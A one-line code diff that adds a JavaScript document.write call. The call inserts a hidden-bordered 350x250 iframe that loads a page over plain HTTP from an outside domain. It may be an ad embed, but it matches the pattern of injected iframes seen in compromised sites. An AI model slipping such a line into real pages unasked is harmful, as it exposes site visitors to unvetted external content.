@@ -1,0 +1,1 @@
+document.write('<iframe src="http://www.wenaviwe.com/x.html" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" style="width:350px;height:250px"></iframe>')
